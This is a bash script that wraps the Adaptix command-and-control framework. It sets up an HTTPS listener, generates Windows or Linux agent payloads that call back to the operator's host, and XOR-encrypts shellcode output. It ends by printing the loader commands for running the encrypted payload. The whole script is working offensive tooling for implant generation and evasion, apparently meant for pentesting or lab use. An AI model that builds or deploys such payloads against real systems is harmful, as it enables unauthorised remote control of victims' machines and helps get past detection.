#!/usr/bin/env bash
# adaptix_quick.sh — One-command Adaptix listener + agent generation.
#
# Wraps adaptix_gen.py for the most common pentesting scenarios.
# Sets up an HTTPS listener on port 443 and generates an agent payload.
#
# Usage:
#   ./adaptix_quick.sh                          # auto-detect tun0 IP
#   ./adaptix_quick.sh 10.10.14.5               # explicit IP
#   ./adaptix_quick.sh 10.10.14.5 shellcode     # shellcode format
#   ./adaptix_quick.sh 10.10.14.5 exe linux     # Linux agent (GopherTCP)
#
# Environment:
#   ADAPTIX_TS       — teamserver URL   (default: https://127.0.0.1:4321/endpoint)
#   ADAPTIX_USER     — username          (default: operator)
#   ADAPTIX_PASSWORD — password           (prompted if unset)
#   ADAPTIX_PORT     — listener port      (default: 443)

set -eu

# ── Arguments ──────────────────────────────────────────────────────────────────
IFACE_OR_IP="${1:-tun0}"
FORMAT="${2:-exe}"
TARGET_OS="${3:-windows}"

# ── Resolve LHOST ──────────────────────────────────────────────────────────────
if [[ "$IFACE_OR_IP" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
    LHOST="$IFACE_OR_IP"
else
    LHOST=$(ip -4 addr show "$IFACE_OR_IP" 2>/dev/null | grep -oP 'inet \K[\d.]+' | head -1 || true)
    if [[ -z "$LHOST" ]]; then
        echo "[!] Could not resolve IP from interface: $IFACE_OR_IP" >&2
        exit 1
    fi
fi

# ── Defaults ───────────────────────────────────────────────────────────────────
TS="${ADAPTIX_TS:-https://127.0.0.1:4321/endpoint}"
USER="${ADAPTIX_USER:-operator}"
PORT="${ADAPTIX_PORT:-443}"

# Agent type based on target OS
if [[ "$TARGET_OS" == "linux" ]]; then
    AGENT_TYPE="gopher_tcp"
else
    AGENT_TYPE="beacon_http"
fi

echo "╔══════════════════════════════════════════════════════════════════════╗"
echo "║  Adaptix C2 — Quick Setup                                         ║"
echo "╠══════════════════════════════════════════════════════════════════════╣"
printf "║  Teamserver : %-53s ║\n" "$TS"
printf "║  LHOST      : %-53s ║\n" "$LHOST"
printf "║  LPORT      : %-53s ║\n" "$PORT"
printf "║  Format     : %-53s ║\n" "$FORMAT"
printf "║  Agent type : %-53s ║\n" "$AGENT_TYPE"
printf "║  Target OS  : %-53s ║\n" "$TARGET_OS"
echo "╚══════════════════════════════════════════════════════════════════════╝"
echo ""

OUTDIR="./adaptix_payloads"
OUTNAME="agent_$(date +%Y%m%d_%H%M%S)"

EXTRA_ARGS=()
if [[ -n "${ADAPTIX_PASSWORD:-}" ]]; then
    EXTRA_ARGS+=(--password "$ADAPTIX_PASSWORD")
fi

python3 "$(dirname "$0")/adaptix_gen.py" \
    --ts "$TS" \
    --user "$USER" \
    "${EXTRA_ARGS[@]}" \
    --lhost "$LHOST" \
    --lport "$PORT" \
    --ssl \
    --agent-type "$AGENT_TYPE" \
    --format "$FORMAT" \
    --arch x64 \
    --outdir "$OUTDIR" \
    --outname "$OUTNAME"

# ── Post-generation: XOR encrypt shellcode if format is shellcode ──────────
if [[ "$FORMAT" == "shellcode" ]] && [[ -f "$OUTDIR/${OUTNAME}.bin" ]]; then
    KEY="0x$(openssl rand -hex 4)"
    echo ""
    echo "[*] Auto-encrypting shellcode with XOR key: $KEY"
    python3 "$(dirname "$0")/xor_encrypt_bin.py" "$OUTDIR/${OUTNAME}.bin" --key "$KEY" 2>/dev/null || true

    if [[ -f "$OUTDIR/${OUTNAME}.bin.enc" ]]; then
        echo "[+] Encrypted: $OUTDIR/${OUTNAME}.bin.enc"
        echo ""
        echo "  Load (Windows): python3 loader.py $OUTDIR/${OUTNAME}.bin.enc --key $KEY"
        echo "  Load (Linux):   python3 linux_loader.py $OUTDIR/${OUTNAME}.bin.enc --key $KEY"
    fi
fi

echo ""
echo "[+] Done."
